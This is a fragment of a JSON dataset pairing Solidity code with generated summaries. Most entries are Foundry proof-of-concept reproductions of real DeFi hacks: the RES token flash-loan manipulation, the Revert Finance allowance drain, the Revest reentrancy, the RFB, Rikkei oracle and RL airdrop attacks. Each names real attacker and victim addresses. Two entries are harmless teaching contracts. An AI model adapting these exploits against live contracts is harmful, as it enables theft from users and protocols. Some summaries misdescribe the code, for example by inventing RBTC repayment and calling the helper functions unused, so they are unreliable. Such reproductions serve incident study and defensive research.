        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Total Lost :  290,671 USDT\n// Attacker : 0x986b2e2a1cf303536138d8ac762447500fd781c6\n// Attack Contract : 0xff333de02129af88aae101ab777d3f5d709fec6f\n// Vulnerable Contract : https://bscscan.com/address/0xeccd8b08ac3b587b7175d40fb9c60a20990f8d21 \n// Attack Tx  0xe59fa48212c4ee716c03e648e04f0ca390f4a4fc921a890fded0e01afa4ba96d\n\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\ncontract Attacker is Test {\n    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 constant alltoken = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);\n\n\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n\n    IPancakePair constant usdtwbnbpair =  IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // wbnb/usdt Pair\n\n    IPancakePair constant usdtrespair =  IPancakePair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A); // usdt/res Pair\n\n    IPancakePair constant allusdtpair = IPancakePair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb); //all/usdt pair\n\n    RES constant restoken = RES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);\n\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 21948016);\n    }\n\n    function stringsEquals(bytes calldata s1, string memory s2) private returns (bool) {\n        bytes memory b1 = bytes(s1);\n       \n        bytes memory b2 = bytes(s2);\n \n        uint256 l1 = b1.length;\n        if (l1 != b2.length) return false;\n        for (uint256 i=0; i<l1; i++) {\n            if (b1[i] != b2[i]) return false;\n        }\n        return true;\n    }\n\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start]  USDT Balance Of Hacker:\", usdt.balanceOf(address(this)), 18);\n\n        usdtwbnbpair.swap(10014120886666860414836616,0, address(this), \"borrowusdt\");\n\n        emit log_named_decimal_uint(\"[Over]  USDT Balance Of Hacker:\", usdt.balanceOf(address(this)), 18);\n        \n    }\n\n    function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n    ) external {\n        if(stringsEquals(data, \"borrowusdt\")){\n            emit log_named_decimal_uint(\"[Flashloan] now Hacker usdt balance is :\", usdt.balanceOf(address(this)), 18);\n\n            usdt.approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, type(uint256).max);\n\n            address[] memory path = new address[](2);\n            path[0] = address(0x55d398326f99059fF775485246999027B3197955);\n            path[1] = address(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);\n            \n            emit log_named_decimal_uint(\"[FlashLoan]  Res Token Balance Of address(user):\", restoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)), 8);\n            \n            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,476862899365088591182696);\n\n            // use flashswap will get more than buy\n            usdtrespair.swap(0, 71519292481906 , address(0x3F693Effc53908d517F186A20431f756C90c2229), \"\");\n\n            console.log(\"[FlashLoan] swap 1 over\");\n            \n            \n            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,953725798730177182365392);\n\n            usdtrespair.swap(0, 22030478307020 , address(0x3F693Effc53908d517F186A20431f756C90c2229), \"\");\n\n            console.log(\"[FlashLoan] swap 2 over\");\n\n            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,1430588698095265773548088);\n\n            usdtrespair.swap(0, 7810673572823 , address(0x3F693Effc53908d517F186A20431f756C90c2229), \"\");\n\n            console.log(\"[FlashLoan] swap 3 over\");\n\n            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,1907451597460354364730784);\n\n            usdtrespair.swap(0, 3504534400905 , address(0x3F693Effc53908d517F186A20431f756C90c2229), \"\");\n\n            console.log(\"[FlashLoan] swap 4 over\");\n\n            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,2384314496825442955913480);\n\n            usdtrespair.swap(0, 1845944923363 , address(0x3F693Effc53908d517F186A20431f756C90c2229), \"\");\n\n            console.log(\"[FlashLoan] swap 5 over\");\n\n            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,2861177396190531547096176);\n\n            usdtrespair.swap(0, 1084945873965 , address(0x3F693Effc53908d517F186A20431f756C90c2229), \"\");\n\n            console.log(\"[FlashLoan] swap 6 over\");\n\n            // cost contract usd\n            restoken.thisAToB();\n\n            // token can't support transfer to contract\n            cheat.prank(0x3F693Effc53908d517F186A20431f756C90c2229);\n            restoken.approve(address(this), type(uint256).max);\n            \n            cheat.prank(0x3F693Effc53908d517F186A20431f756C90c2229);\n            alltoken.approve(address(this), type(uint256).max);\n\n\n            uint res_balance = restoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));\n            \n            emit log_named_decimal_uint(\"[FlashLoan]  Res Token Balance Of address(user):\", res_balance, 8);\n            \n            emit log_named_decimal_uint(\"[FlashLoan]  All Token Balance Of address(user):\", alltoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)), 18);\n\n            uint256 alltoken_balance =  alltoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));\n            \n\n            alltoken.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, 0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb, alltoken_balance);\n\n            console.log(\"transfer all token over\");\n\n            \n            (uint256 reserve0, uint256 reserve1, uint32 blockTimestampLast) = allusdtpair.getReserves();\n            \n            uint256 get_value =  (alltoken_balance * reserve1 )/ (alltoken_balance  + reserve0) ; \n\n        \n            uint256 getusdamount = get_value - ( (get_value*10/10000));\n\n            allusdtpair.swap(0, getusdamount, address(this), \"\");\n\n            emit log_named_decimal_uint(\"[FlashLoan] sell Alltoken over, Hacker usdt balance is :\", usdt.balanceOf(address(this)), 18);\n\n            restoken.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, 0x05ba2c512788bd95cd6D61D3109c53a14b01c82A, res_balance);\n            \n            usdtrespair.swap(1905851854454828201052166, 0 , address(this), \"\");\n\n            emit log_named_decimal_uint(\"[FlashLoan] sell Restoken over, Hacker usdt balance is :\", usdt.balanceOf(address(this)), 18);\n\n            uint256 refund = amount0 + ((amount0 *251/100000));\n            usdt.transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, refund);\n\n        }\n        else{\n          console.log(\"error\");\n        }\n    \n    }\n\n\n    receive() external payable {}\n}\n\ninterface RES {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _decimals() external view returns (uint8);\n\n    function _lpAddress() external view returns (address);\n\n    function _name() external view returns (string memory);\n\n    function _referee(address) external view returns (address);\n\n    function _swapV2Pair() external view returns (address);\n\n    function _symbol() external view returns (string memory);\n\n    function addBlack(address addressBlack) external;\n\n    function addWhite(address addressWhite) external;\n\n    function addWhiteContract(address addressWhite) external;\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function bindReferee(address addr) external returns (bool success);\n\n    function burn(uint256 amount) external returns (bool);\n\n    function decimals() external view returns (uint8);\n\n    function decreaseAllowance(address spender, uint256 subtractedValue)\n        external\n        returns (bool);\n\n    function getOwner() external view returns (address);\n\n    function increaseAllowance(address spender, uint256 addedValue)\n        external\n        returns (bool);\n\n    function mint(uint256 amount) external returns (bool);\n\n    function name() external view returns (string memory);\n\n    function owner() external view returns (address);\n\n    function renounceOwnership() external;\n\n    function setBuyFee(uint256 buyFee) external;\n\n    function setFoundationAddress(address foundationAddress) external;\n\n    function setLpAddress(address lpAddress) external;\n\n    function setMinAToB(uint256 min) external;\n\n    function setPropagandaAddress(address propagandaAddress) external;\n\n    function setSellFee(uint256 sellFee) external;\n\n    function symbol() external view returns (string memory);\n\n    function thisAToB() external;\n\n    function totalSupply() external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    function transferOwnership(address newOwner) external;\n}\n",
        "summary": "This code defines a contract that launches a flash loan attack on a vulnerable smart contract on the Binance Smart Chain. The attacker swaps a large amount of USDT for a token called RES using multiple calls to the PancakeSwap decentralized exchange, sells the RES tokens for ALL tokens, and then sells the ALL tokens for USDT, making a profit in the process. The attack is executed through the `testExploit()` function, which triggers a `pancakeCall()` function that performs the flash loan attack. The code also includes several helper functions and interfaces for interacting with various smart contracts on the blockchain.",
        "id": "bd4ecd41-c802-4331-8abd-dccb8b48fed3"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// \u8fd4\u56de\u591a\u4e2a\u53d8\u91cf\n// \u547d\u540d\u5f0f\u8fd4\u56de\n// \u89e3\u6784\u8d4b\u503c\n\ncontract Return {\n    // \u8fd4\u56de\u591a\u4e2a\u53d8\u91cf\n    function returnMultiple() public pure returns(uint256, bool, uint256[3] memory){\n        return(1, true, [uint256(1),2,5]);\n    }\n\n    // \u547d\u540d\u5f0f\u8fd4\u56de\n    function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array){\n        _number = 2;\n        _bool = false; \n        _array = [uint256(3),2,1];\n    }\n\n    // \u547d\u540d\u5f0f\u8fd4\u56de\uff0c\u4f9d\u7136\u652f\u6301return\n    function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array){\n        return(1, true, [uint256(1),2,5]);\n    }\n\n    // \u8bfb\u53d6\u8fd4\u56de\u503c\uff0c\u89e3\u6784\u5f0f\u8d4b\u503c\n    function readReturn() public pure{\n        // \u8bfb\u53d6\u5168\u90e8\u8fd4\u56de\u503c\n        uint256 _number;\n        bool _bool;\n        bool _bool2;\n        uint256[3] memory _array;\n        (_number, _bool, _array) = returnNamed();\n        \n        // \u8bfb\u53d6\u90e8\u5206\u8fd4\u56de\u503c\uff0c\u89e3\u6784\u5f0f\u8d4b\u503c\n        (, _bool2, ) = returnNamed();\n    }\n}\n",
        "summary": "This is a Solidity smart contract that demonstrates how to return multiple values from a function using various techniques. The contract includes the following functions:\n\n1. `returnMultiple`: returns three values (uint256, bool, uint256[3] array) using parentheses to group them together.\n2. `returnNamed`: returns the same three values, but uses names for them instead of relying on their position in the return statement.\n3. `returnNamed2`: a variation of `returnNamed` that still supports the traditional way of returning values using parentheses.\n4. `readReturn`: a function that demonstrates how to read the returned values using destructuring assignment. It shows how to read all three values or just a subset of them. \n\nThe contract contains comments to explain each function in more detail. Additionally, the SPDX-License-Identifier metadata is included at the beginning of the contract to specify the license under which the code is released.",
        "id": "fa46b463-b1dc-4631-9ca2-6582f00b178b"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function MyContract() {\n    assert(myMethod() == 10);\n  }\n\n  function myMethod() returns (uint num) {\n    num = 10;\n    return num;\n  }\n}\n",
        "summary": "This code is a Solidity smart contract with a constructor function that initializes the contract. The constructor function asserts that the return value of the `myMethod()` function is equal to 10. The `myMethod()` function simply sets the value of a variable `num` to 10 and returns it.",
        "id": "af4b2b1a-d073-49bf-b93d-9dc26c0b15fc"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://mirror.xyz/revertfinance.eth/3sdpQ3v9vEKiOjaHXUi3TdEfhleAXXlAEWeODrRHJtU\n// @TX\n// https://etherscan.io/tx/0xdaccbc437cb07427394704fbcc8366589ffccf974ec6524f3483844b043f31d5\n\ninterface V3Utils {\n    struct SwapParams {\n        address tokenIn;\n        address tokenOut;\n        uint256 amountIn;\n        uint256 minAmountOut;\n        address recipient; // recipient of tokenOut and leftover tokenIn (if any leftover)\n        bytes swapData;\n        bool unwrap; // if tokenIn or tokenOut is WETH - unwrap\n    }\n\n    function swap(SwapParams calldata params) external;\n}\n\ncontract ContractTest is Test {\n    V3Utils utils = V3Utils(0x531110418d8591C92e9cBBFC722Db8FFb604FAFD);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    address[] victims = [0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, 0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2];\n    uint256 counter;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_653_389);\n        cheats.label(address(utils), \"utils\");\n        cheats.label(address(USDC), \"USDC\");\n    }\n\n    function testExploit() external {\n        for (uint256 i; i < victims.length; ++i) {\n            uint256 transferAmount = USDC.balanceOf(victims[i]);\n            if (USDC.allowance(victims[i], address(utils)) < transferAmount) {\n                transferAmount = USDC.allowance(victims[i], address(utils));\n                if (transferAmount == 0) continue;\n            }\n            bytes memory data = abi.encodeWithSignature(\n                \"transferFrom(address,address,uint256)\", victims[i], address(this), transferAmount\n            );\n            bytes memory swapdata = abi.encode(address(USDC), address(this), data);\n            V3Utils.SwapParams memory params = V3Utils.SwapParams({\n                tokenIn: address(this),\n                tokenOut: address(this),\n                amountIn: 1,\n                minAmountOut: 0,\n                recipient: address(this),\n                swapData: swapdata,\n                unwrap: false\n            });\n            utils.swap(params);\n            counter--;\n        }\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n            );\n    }\n\n    function transferFrom(address from, address to, uint256 value) external returns (bool) {\n        counter++;\n        return true;\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        return true;\n    }\n\n    function balanceOf(address owner) external view returns (uint256) {\n        if (counter == 1) return 1;\n        else return 0;\n    }\n}\n",
        "summary": "This is a Solidity smart contract that performs an exploit of a vulnerability found on the Revert Finance protocol. The `testExploit` function transfers USDC tokens from two victim addresses to the attacker's address by taking advantage of the `transferFrom` function and a complex call to the `V3Utils.swap` function. The `setUp` function sets up some initial test data. The `V3Utils` and `IERC20` interfaces are imported, and the `CheatCodes` contract is called. The `transferFrom`, `approve`, `transfer`, and `balanceOf` functions are defined but are not used within the contract itself.",
        "id": "0b61915c-83f8-4a82-a506-c6809f50f7dd"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IUniswapV2Pair pair =\n    IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);\n  IERC20 rena = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);\n  IRevest revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);\n  uint256 fnftId;\n  bool reentered = false;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14465356); //fork mainnet at 14465356\n  }\n\n  function testExploit() public {\n    emit log_named_uint(\n      \"Before exploit, Rena balance of attacker:\",\n      rena.balanceOf(msg.sender)\n    );\n    pair.swap(5 * 1e18, 0, address(this), new bytes(1));\n    emit log_named_uint(\n      \"After exploit, Rena balance of attacker:\",\n      rena.balanceOf(msg.sender)\n    );\n  }\n\n  function uniswapV2Call(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) public {\n    rena.approve(address(revest), type(uint256).max);\n    IRevest.FNFTConfig memory fnftConfig;\n    fnftConfig.asset = address(rena);\n    fnftConfig.pipeToContract = 0x0000000000000000000000000000000000000000;\n    fnftConfig.depositAmount = 0;\n    fnftConfig.depositMul = 0;\n    fnftConfig.split = 0;\n    fnftConfig.depositStopTime = 0;\n    fnftConfig.maturityExtension = false;\n    fnftConfig.isMulti = true;\n    fnftConfig.nontransferrable = false;\n\n    address[] memory recipients = new address[](1);\n    uint256[] memory quantities = new uint256[](1);\n    recipients[0] = address(this);\n    quantities[0] = uint256(2);\n    fnftId = revest.mintAddressLock(\n      address(this),\n      new bytes(0),\n      recipients,\n      quantities,\n      fnftConfig\n    );\n    quantities[0] = uint256(360000);\n    revest.mintAddressLock(\n      address(this),\n      new bytes(0),\n      recipients,\n      quantities,\n      fnftConfig\n    );\n\n    revest.withdrawFNFT(fnftId + 1, 360000 + 1);\n\n    rena.transfer(msg.sender, ((((amount0 / 997) * 1000) / 99) * 100) + 1000);\n    rena.transfer(tx.origin, rena.balanceOf(address(this)));\n  }\n\n  function onERC1155Received(\n    address operator,\n    address from,\n    uint256 id,\n    uint256 value,\n    bytes calldata data\n  ) public returns (bytes4) {\n    if (id == fnftId + 1 && !reentered) {\n      reentered = true;\n      revest.depositAdditionalToFNFT(fnftId, 1e18, 1);\n    }\n    return this.onERC1155Received.selector;\n  }\n}\n",
        "summary": "This code is a Solidity smart contract used to test for an exploit. It imports other Solidity contracts and initializes variables and objects. The `setUp()` function initializes a `CheatCodes` object to fork the Ethereum mainnet at a specific block. The `testExploit()` function emits logs for the balance of a specific ERC20 token (`rena`) before and after a swap occurs through the `uniswapV2Call()` function. The `uniswapV2Call()` function approves a transfer from `rena` to `revest`, mints AddressLock tokens (`FNFTs`), withdraws a specified amount from them, transfers a specified amount of `rena` tokens, and returns remaining tokens to the caller. The `onERC1155Received()` function deposits additional `rena` tokens to an AddressLock token and prevents re-entrancy attacks.",
        "id": "62d1d7e2-bc7f-45a5-8d04-9361e598263c"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1599991294947778560\n// @TX\n// https://bscscan.com/tx/0xcc8fdb3c6af8bb9dfd87e913b743a13bbf138a143c27e0f387037887d28e3c7a\n\ncontract ContractTest is DSTest{\n    IERC20 RFB = IERC20(0x26f1457f067bF26881F311833391b52cA871a4b5);\n    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x03184AAA6Ad4F7BE876423D9967d1467220a544e);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23649423);\n    }\n\n    function testExploit() public payable{\n        RFB.approve(address(Router), type(uint).max);\n        WBNB.approve(address(Router), type(uint).max);\n        payable(address(uint160(0))).transfer(address(this).balance);\n        DVM(dodo).flashLoan(20 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        WBNB.withdraw(20 * 1e18);\n        for(uint i = 0; i < 50; i++){\n            try this.check(20 * 1e18 - i) {\n                \n            } catch {\n                continue;\n            }\n        }\n        WBNB.deposit{value: address(this).balance}();\n        WBNB.transfer(dodo, 20 * 1e18);\n    }\n\n    function check(uint amount) public payable{\n        uint BNBBalance = address(this).balance;\n        BNBToRFB(amount);\n        RFBToBNB();\n        require(address(this).balance - BNBBalance > 0);\n    }\n\n    function BNBToRFB(uint amount) public payable{\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(RFB);\n        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function RFBToBNB() public payable{\n        address [] memory path = new address[](2);\n        path[0] = address(RFB);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            RFB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    receive() payable external{}\n\n}\n",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in a decentralized exchange protocol called DODO, which allows an attacker to earn profits by manipulating token prices. The contract first sets up the necessary contracts and calls a function that creates a fork on the Binance Smart Chain. Then, it calls a test function that approves tokens and transfers BNB to the contract. The exploit takes place in a function called `DPPFlashLoanCall`, where the attacker uses flash loans to manipulate the price of tokens and earn profits. The `check` function is used to check if the exploit was successful.",
        "id": "e621b4c6-5129-4f78-b57e-1642f6d9ae7b"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);\n  IRToken rbnb = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);\n  IRToken rusdc = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);\n  ICointroller cointroller =\n    ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);\n  ISimplePriceOracle simplePriceOracle =\n    ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);\n  IPriceFeed chainlinkBNBUSDPriceFeed =\n    IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 16956474); //fork bsc at block 16956474\n  }\n\n  function testExploit() public {\n    emit log_named_uint(\n      \"Before exploit, USDC balance of attacker:\",\n      usdc.balanceOf(address(this))\n    );\n    rbnb.approve(address(cointroller), type(uint256).max);\n    address[] memory rTokens = new address[](1);\n    rTokens[0] = address(rbnb);\n    cointroller.enterMarkets(rTokens);\n    rbnb.mint{ value: 100000000000000 }();\n    simplePriceOracle.setOracleData(address(rbnb), address(this));\n    rusdc.borrow(rusdc.getCash());\n    rusdc.transfer(msg.sender, rusdc.balanceOf(address(this)));\n    simplePriceOracle.setOracleData(\n      address(rbnb),\n      address(chainlinkBNBUSDPriceFeed)\n    );\n    emit log_named_uint(\n      \"After exploit, USDC balance of attacker:\",\n      usdc.balanceOf(address(this))\n    );\n  }\n\n  function decimals() external view returns (uint8) {\n    return chainlinkBNBUSDPriceFeed.decimals();\n  }\n\n  function latestRoundData()\n    external\n    view\n    returns (\n      uint80 roundId,\n      int256 answer,\n      uint256 startedAt,\n      uint256 updatedAt,\n      uint80 answeredInRound\n    )\n  {\n    (\n      roundId,\n      answer,\n      startedAt,\n      updatedAt,\n      answeredInRound\n    ) = chainlinkBNBUSDPriceFeed.latestRoundData();\n    answer = answer * 1e10;\n  }\n}\n",
        "summary": "The code is a Solidity smart contract used for testing exploits on a decentralized finance (DeFi) protocol. It imports various interfaces and contracts related to the DeFi protocol being tested and defines a test function called `testExploit()`. Within this function, the smart contract calls various methods from the imported interfaces and contracts to carry out the exploit. The goal of the exploit is to borrow as much of the protocol's Bitcoin (RBTC) as possible, then manipulate the price feed oracle to overvalue RBTC in USD terms, allowing the attacker to repay the borrowed RBTC for less than its true value. The code also includes a `setUp()` function to prepare the test environment and some helper functions for accessing price feed data.",
        "id": "87933d95-89b0-440f-bc9c-b3da2cc64d3c"
    },
    {
        "code": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Report https://twitter.com/CertiKAlert/status/1576195971003858944\n// Attacker : 0x08e08f4b701d33c253ad846868424c1f3c9a4db3\n// Attack Contract : 0x5EfD021Ab403B5b6bBD30fd2E3C26f83f03163d4\n// Vulnerable Contract : https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888 \n// Attack Tx  0xe15d261403612571edf8ea8be78458b88989cf1877f0b51af9159a76b74cb466\ninterface IDODO {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external;\n\n    function _BASE_TOKEN_() external view returns (address);\n}\n\ninterface RLLpIncentive{\n    function distributeAirdrop(address user) external;\n}\n\n\ncontract AirDropRewardContract{\n    IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);\n    RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);\n    IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);\n    constructor() {\n        RL.transfer(address(this), 0);\n    }\n\n    function airDropReward(address receiver) external{\n        RLL.distributeAirdrop(address(this));\n        RL.transfer(receiver, RL.balanceOf(address(this)));\n        Pair.transfer(receiver, Pair.balanceOf(address(this)));\n    }\n}\n\ncontract ContractTest is DSTest{\n\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);\n    RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);\n    IDODO dodo = IDODO(0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE);\n    IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address [] public contractAddress;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21794289); \n    }\n\n    function testExploit() external{\n\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n        USDT.approve(address(Router), ~uint256(0));\n        RL.approve(address(Router), ~uint256(0));\n        Pair.approve(address(Router), ~uint256(0));\n        airDropContractFactory();\n        //change timestamp to pass check\n        cheats.warp(block.timestamp + 24 * 60 * 60);\n        dodo.flashLoan(0, 450_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        buyRLAndAddLiquidity();\n        //claimAirDrop\n        for(uint i = 0; i < contractAddress.length; i++){\n            Pair.transfer(contractAddress[i], Pair.balanceOf(address(this)));\n            (bool success,) = contractAddress[i].call(abi.encodeWithSignature(\"airDropReward(address)\", address(this)));\n            require(success);\n        }\n        \n        removeLiquidityAndSellRL();\n        USDT.transfer(msg.sender, 450_000 * 1e18);\n    }\n\n    function buyRLAndAddLiquidity() public{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(RL);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            150_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n\n        Router.addLiquidity(\n            address(USDT),\n            address(RL),\n            USDT.balanceOf(address(this)),\n            RL.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n\n    }\n\n    function removeLiquidityAndSellRL() public{\n        Router.removeLiquidity(\n            address(USDT),\n            address(RL),\n            Pair.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n\n        address [] memory path = new address[](2);\n        path[0] = address(RL);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            RL.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n\n\n    }\n\n    function airDropContractFactory() public{\n        address _add;\n        bytes memory bytecode = type(AirDropRewardContract).creationCode;\n        for(uint _salt = 0; _salt < 100; _salt++){\n            assembly{\n                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)\n            }\n            contractAddress.push(_add);\n        }\n    }\n\n\n}\n\n",
        "summary": "This is a Solidity contract written in version 0.8.10 that includes multiple interfaces and contracts. The purpose of this code is to exploit a vulnerability in a smart contract on the Binance Smart Chain (BSC) blockchain. The vulnerability allows an attacker to perform a flash loan attack on a DODO liquidity pool contract and make an arbitrary withdrawal. The attack exploits an airdrop reward mechanism in the vulnerable contract, triggering rewards and withdrawing them to the attacker's account. The code also includes functions for buying and selling tokens, adding liquidity to a liquidity pool, and creating a number of AirDrop reward contracts to be used in the exploit.",
        "id": "880ceb40-6026-4a6d-8788-c3425580f0e4"
    },
    {
